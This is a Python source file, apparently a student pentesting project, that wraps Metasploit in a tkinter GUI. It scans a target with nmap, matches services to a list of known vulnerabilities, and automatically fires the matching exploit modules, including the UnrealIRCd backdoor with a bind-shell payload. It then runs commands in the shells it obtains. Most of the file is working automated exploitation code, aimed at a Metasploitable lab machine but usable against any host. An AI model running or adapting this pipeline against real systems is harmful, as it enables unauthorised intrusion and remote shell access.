# for now this nmaps metasploitable, checks if port 6667 is open which runs UnrealIRCd
# which has a vulnerability, and then it exploits that
# NOT ALL VULNERABILITIES LIKE TO RUN AT THE SAME TIME.  SOME ONLY WORK WHEN RUN INDIVIDUALLY

from pymetasploit3.msfrpc import *
import time
import utils
import sys
import nmap_dest
import re
import subprocess
import os
from knownVulnerabilities import vulnerabilities
import tkinter as tk
import tkinter.messagebox
from tkinter import simpledialog
from tkinter import ttk

initial_setup_done = False
server_setup_done = False
RHOSTS = None #Holds our target IP addresses
client = None #Holds our metasploit client

# Does initial setup
def run_setup_script():
    global initial_setup_done, setup_button
    if not initial_setup_done:
        subprocess.Popen(["./setup.sh"], shell=True)
        initial_setup_done = True
        setup_button.config(state="disabled")
        
        # Create a top-level pop-up window
        popup = tk.Toplevel(root)
        popup.title("Initial Setup in Progress")
        message = tk.Label(popup, text="Initial setup started, please wait 3 minutes. \nThis window will close automatically once it's done! \n\nNote: you will need to input your password in terminal to properly run the sudo commands.\n\n Note: If it says you have the requirements already then feel free to close this window and move on.")
        message.pack()

        # Function to close the popup
        def close_popup():
            popup.destroy()
            
        # Schedule the popup to close after 180 seconds (3 minutes)
        popup.after(180000, close_popup)
        

# Sets up msfconsole RPC server
def run_server_script():
    global server_setup_done, server_button
    if not server_setup_done:
        subprocess.Popen(["./server.sh"], shell=True)
        server_setup_done = True
        server_button.config(state="disabled")
       
       # Create a top-level pop-up window
        popup = tk.Toplevel(root)
        popup.title("Server Setup in Progress")
        message = tk.Label(popup, text="Server setup started, please wait 10 seconds. \nThis window will close automatically once it's done! \n\nNote: You only need to run this if you restarted your computer since the last time you ran this setup.")
        message.pack()

        # Function to close the popup
        def close_popup():
            popup.destroy()
            tk.messagebox.showinfo("Server Setup Script", "Server setup completed, Go have fun.")

        # Schedule the popup to close after 10 seconds
        popup.after(10000, close_popup)

# Gets nmap aggressiveness from GUI
def retrieve_input():
    # Get the input from the entry widget
    input_value = entry.get()
    try:
        # Convert to integer and validate range
        aggressiveness = int(input_value)
        if 0 <= aggressiveness <= 5:
            # Call your Nmap scan function here with aggressiveness
            print(f"Running Nmap scan with aggressiveness {aggressiveness}")
        else:
            print("Please enter a valid number between 0 and 5. Note that higher is faster but more detectable.")
    except ValueError:
        print("Please enter a valid integer.")

# Initiates an Nmap scan with the aggressiveness specified in the GUI
def initiate_nmap_scan():
    # Assuming aggressiveness is obtained from the GUI
    aggressiveness = int(entry.get())
    if 0 <= aggressiveness <= 5:
        # Call your Nmap scan function here with aggressiveness
        nmap_dest.run_scan(aggressiveness)  # Replace with actual function call
        print(f"Running Nmap scan with aggressiveness {aggressiveness}")
    else:
        tk.messagebox.showwarning("Warning", "Please enter a valid number between 0 and 5.")


# Updates the RHOSTS combobox with new items
def update_rhosts_combobox(new_items):
    rhosts_combobox['values'] = new_items
    if new_items:
        rhosts_combobox.current(0)  # Optionally, set the first item as the default selection

# Updates the RHOSTS variable when a new item is selected
def on_rhosts_select(event):
    global RHOSTS
    selected_value = rhosts_combobox.get()
    if selected_value and selected_value != "Select RHOST":
        RHOSTS = selected_value
        print(f"RHOSTS set to: {RHOSTS}")  # For debugging

# Starts metasploit and kills all previous sessions
def start_metasploit():
    global client # We need to make client global so we can use it in other functions
    client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    for k in client.sessions.list.keys():
        client.sessions.session(str(k)).stop()
    print("session list =", client.sessions.list)
    tk.messagebox.showinfo("Metasploit", "Metasploit started and previous sessions killed.")


###################################### GUI ######################################
# Create the GUI
root = tk.Tk()
root.title("Bootcon Pentesting Tool GUI v0.1")

##### Create widgets here #####

# Button to run initial setup script
setup_button = tk.Button(root, text="Run Initial Setup", command=run_setup_script)
setup_button.pack()

# Button to run server script
server_button = tk.Button(root, text="Run Server Setup", command=run_server_script)
server_button.pack()

# Input for aggressiveness of Nmap scan
label = tk.Label(root, text="Enter the aggressiveness of the nmap scan (0-5):")
label.pack()

entry = tk.Entry(root)
entry.pack()

button = tk.Button(root, text="Submit", command=retrieve_input)
button.pack()

# Button to start metasploit
metasploit_button = tk.Button(root, text="Start Metasploit", command=start_metasploit)
metasploit_button.pack()

# Start Nmap scan button
nmap_button = tk.Button(root, text="Submit Nmap Scan", command=initiate_nmap_scan)
nmap_button.pack()

# RHost dropdown menu
rhosts_combobox = ttk.Combobox(root)
rhosts_combobox['values'] = ["Select RHOST", "Example 1", "Example 2"]  # Placeholder values
rhosts_combobox.current(0)  # Set the combobox to show the first item
rhosts_combobox.pack()

rhosts_combobox.bind("<<ComboboxSelected>>", on_rhosts_select)

# Run the application (Remember everything that is used needs to be defined above this)
root.mainloop()

# We need to set the bellow to be called via the GUI
# We basically have to setup the fuctions to be called via the buttons unless we want to try messing with threading in which case we could have the automated stuff just
# blocked by a pause that is broken by a button press then it does all the auto stuff. We could also put all the stuff into one giant function and have that called with a RUN button.
#
# Setup functions that are called via the buttons:
# def do_thing():
#     print("Doing thing")
#     #put thing we doing here
#
# Then we add the button for that with:
# do_thing_button = tk.Button(root, text="Do Thing", command=do_thing)
# do_thing_button.pack()

if __name__ == "__main__":
    #############################################################################
    ### UNCOMMENT THIS TO RUN THE PROGRAM, THEN COMMENT THIS OUT ONCE YOU RUN THE 
    # PROGRAM ONCE, this must run every time you restart computer ###
    # proc1 = subprocess.Popen(["./setup.sh"])
    # time.sleep(180)
    # proc1.kill()
    ### COMMENT THIS OUT ONCE YOU RUN THE PROGRAM ONCE, must run every time you restart computer###

    # basically starts metasploit and kill all previous sessions 
    #client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    #for k in client.sessions.list.keys():
    #    client.sessions.session(str(k)).stop()
    #print("session list =", client.sessions.list)

    ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
    # Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
    vulnerability = vulnerabilities[3]
    print(vulnerability.description)
    print(vulnerability.module)
    RHOSTS = "192.168.1.162" # PUT YOUR HOST HERE
    module = vulnerability.module
    exploit = client.modules.use(vulnerability.exploitType, module)
    print(exploit)
    # options = exploit.options
    missingOptions = exploit.missing_required
    if 'RHOSTS' in missingOptions:
        print(RHOSTS)
        exploit['RHOSTS'] = RHOSTS
    print("missing options:", exploit.missing_required)
    if vulnerability.payload:
        print("payload:", vulnerability.payload)
        exploit.execute(payload=vulnerability.payload)
    else:
        print("no payload")
        exploit.execute()
    time.sleep(vulnerability.sleep)
    print(client.sessions.list)
    exit()
    ######### TEST

    ######## RECONAISSANCE PHASE ########
    RHOSTS = "192.168.1.162"
    nmapAggressiveness = 2
    # in order of increasing levels of fucking around (and also in increasing levels of finding out)
    nmapPossibleArgs = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
    nmapArgs = nmapPossibleArgs[nmapAggressiveness]
    output = nmap_dest.nmap_xml_output(RHOSTS, nmapArgs)
    print(output)
    if (output[1][0:22] == "Note: Host seems down."):
        print("Host seems down. Exiting.")
        exit()

    ######## WEAPONIZATION PHASE ########
    vulnerabilitiesToUse = set()
    for line in output:
        # Detect what keywords each line of the nmap output contains and compare those to the descriptions
        # for each known vulnerability and if all key words of a vulnerability are found, add it to the exploit list
        for vulnerability in vulnerabilities:
            keyWordsFoundCount = 0
            flag = None
            if vulnerability.caseSensitiveKeyTermMatch:
                flag = 0
            else:
                flag = re.IGNORECASE
            # TODO: make it so there is a list of optional or guaranteed key terms
            for keyword in vulnerability.keywords:
                if re.search(keyword, line, flag):
                    keyWordsFoundCount += 1
            if keyWordsFoundCount < vulnerability.minKeyTermsThatMustMatch:
                continue
            if not vulnerability in vulnerabilitiesToUse:
                vulnerabilitiesToUse.add(vulnerability)
                print("*********", vulnerability.description, "EXPLOIT FOUND *********")

    ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
    # exploit = client.modules.use(vulnerability.exploitType, 'unix/irc/unreal_ircd_3281_backdoor')
    # exploit['RHOSTS'] = RHOSTS
    # payload = client.modules.use('payload', 'cmd/unix/bind_ruby')
    # exploit.execute(payload='cmd/unix/bind_ruby')
    for vulnerability in vulnerabilitiesToUse:
        module = vulnerability.module
        exploit = client.modules.use(vulnerability.exploitType, module)
        # options = exploit.options
        missingOptions = exploit.missing_required
        print("######## EXPLOITING", vulnerability.description, "########")
        if 'RHOSTS' in missingOptions:
            exploit['RHOSTS'] = RHOSTS
        if vulnerability.payload:
            exploit.execute(payload=vulnerability.payload)
        else:
            exploit.execute()
        time.sleep(vulnerability.sleep)
        numSessions = 0
        for k in client.sessions.list.keys():
            numSessions += 1
        print("Total number of sessions created:", numSessions)
        # # if we have a session established, leave
        # for _session in client.sessions.list.keys():
        #     break
    
    ####### Print some info on the sessions created
    print("@@@@@@@@ ALL EXPLOITS FINISHED @@@@@@@@")
    sessions = client.sessions.list
    numSessions = 0
    for k in client.sessions.list.keys():
        numSessions += 1
    print("Number of sessions created:", numSessions)

    for k in client.sessions.list.keys():
        shell = client.sessions.session(str(k))
        shell.write('whoami')
        shell.write('pwd')
        print(shell.read())

    print()
    